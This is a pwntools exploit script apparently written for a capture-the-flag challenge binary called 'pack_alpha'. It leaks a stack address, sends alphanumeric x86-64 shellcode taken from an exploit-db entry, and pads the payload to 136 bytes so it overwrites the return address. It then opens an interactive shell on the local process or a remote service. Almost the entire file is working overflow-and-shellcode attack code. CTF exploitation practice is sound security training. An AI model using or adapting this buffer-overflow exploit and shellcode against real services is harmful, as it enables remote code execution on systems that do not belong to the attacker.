from pwn import *

context.log_level = 'CRITICAL'

def init(conn):
	conn.sendlineafter(b'address: ', b'JUNK')
	conn.sendlineafter(b'Age: ', b'123')
	addr = conn.recvline().decode().split(': ')
	addr = int(addr[1][2:-1], 16)
	conn.sendlineafter(b'name: ', b'-1')
	conn.recvuntil(b'name: ')
	return addr

# https://www.exploit-db.com/exploits/35205
shellcode = b'XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V'

if args.LOCAL:
	p = process('./pack_alpha')
else:
	host = 'gc1.eng.run'
	port = 31599
	p = remote(host, port)


addr = init(p)
payload = shellcode
payload += b'A' * (136 - len(payload))
payload += p64(addr)
p.send(payload)

p.interactive()
p.close()